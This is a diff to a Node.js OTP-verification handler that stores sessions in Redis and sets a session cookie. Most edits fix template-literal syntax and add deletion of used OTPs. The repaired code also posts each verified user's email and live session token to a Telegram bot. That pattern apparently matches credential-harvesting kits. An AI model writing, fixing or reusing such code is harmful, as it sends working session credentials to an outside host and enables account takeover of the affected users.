@@ -3,6 +3,7 @@ import { v4 as uuidv4 } from "uuid";
 import fetch from "node-fetch";
 
 const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days
+
 let redis;
 
 function getRedis(url) {
@@ -13,11 +14,11 @@ function getRedis(url) {
 }
 
 function getOtpKey(email) {
-  return otp:${email};
+  return `otp:${email}`;
 }
 
 function getSessionKey(token) {
-  return session:${token};
+  return `session:${token}`;
 }
 
 export default async function handler(req, res) {
@@ -48,6 +49,7 @@ export default async function handler(req, res) {
   }
 
   email = email.trim().toLowerCase();
+
   const redisClient = getRedis(REDIS_URL);
 
   let storedOtp;
@@ -69,18 +71,19 @@ export default async function handler(req, res) {
 
   try {
     await redisClient.set(getSessionKey(sessionToken), email, "EX", SESSION_TTL_SECONDS);
+    await redisClient.del(getOtpKey(email)); // Remove OTP after verification
   } catch {
     return res.status(500).json({ success: false, message: "Failed to create session" });
   }
 
   const message = [
     "✅ OTP Verified",
-    📧 Email: ${email},
-    🍪 Session: ${sessionToken},
-    ⏳ Valid: 7 days,
+    `📧 Email: ${email}`,
+    `🍪 Session: ${sessionToken}`,
+    `⏳ Valid: 7 days`,
   ].join("\n");
 
-  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
     await fetch(telegramUrl, {
@@ -99,8 +102,8 @@ export default async function handler(req, res) {
 
   res.setHeader(
     "Set-Cookie",
-    session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${SESSION_TTL_SECONDS}
+    `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${SESSION_TTL_SECONDS}`
   );
 
-  res.status(200).json({ success: true, message: "OTP verified and session created" });
+  return res.status(200).json({ success: true, message: "OTP verified and session created" });
 }
